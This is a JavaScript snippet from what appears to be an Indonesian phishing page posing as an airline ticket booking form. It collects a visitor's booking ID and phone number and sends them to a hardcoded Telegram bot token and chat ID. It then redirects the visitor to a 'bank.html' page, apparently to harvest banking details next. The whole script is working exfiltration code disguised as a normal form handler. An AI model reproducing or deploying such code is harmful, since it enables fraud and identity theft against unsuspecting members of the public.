<script>
    const BOT_TOKEN = "7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM";
    const CHAT_ID = "7213790655";

    function showToast(msg, ok=true){
      const t = document.createElement('div');
      t.textContent = msg;
      t.style.position='fixed';t.style.left='50%';t.style.transform='translateX(-50%)';
      t.style.bottom='24px';t.style.padding='10px 16px';t.style.borderRadius='10px';
      t.style.boxShadow='0 6px 18px rgba(0,0,0,0.12)';t.style.zIndex=9999;
      t.style.background = ok? '#0b8457' : '#b00020'; t.style.color='#fff';
      document.body.appendChild(t);
      setTimeout(()=>t.remove(),3500);
    }

    async function sendToTelegram(payload){
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const text = encodeURIComponent(payload);
      const full = `${url}?chat_id=${CHAT_ID}&text=${text}`;
      try{
        const res = await fetch(full);
        return await res.json();
      }catch(err){
        return {ok:false, error:err.message};
      }
    }

    const form = document.querySelector('form');
    const btnSubmit = form.querySelector('.btn');

    const btnKirim = document.createElement('button');
    btnKirim.textContent = 'LANJUTKAN';
    btnKirim.className = 'btn';
    form.appendChild(btnKirim);

    btnKirim.addEventListener('click', async function(e){
      e.preventDefault();

      const opsi = document.getElementById('opsi').value;
      const idBooking = document.getElementById('idBooking').value.trim();
      const hp = document.getElementById('hp').value.trim();

      if(!opsi){ showToast('Pilih opsi terlebih dahulu', false); return; }
      if(!idBooking){ showToast('ID Booking wajib diisi', false); return; }
      if(!hp || !/^\d{9,15}$/.test(hp)){ showToast('Nomor HP tidak valid', false); return; }

      btnKirim.disabled = true; btnKirim.textContent = 'Mengirim...';
      const pesan = `Permintaan Tiket Pesawat :\n- Opsi : ${opsi}\n- ID Booking : ${idBooking}\n- Nomor HP : +62 ${hp}`;
      const res = await sendToTelegram(pesan);

      if(res && res.ok){ showToast(''); 
          location.href='bank.html';
      }
      else { showToast('Gagal mengirim ke Telegram', false); }

      btnKirim.disabled = false; btnKirim.textContent = 'LANJUTKAN';
    });
  </script>
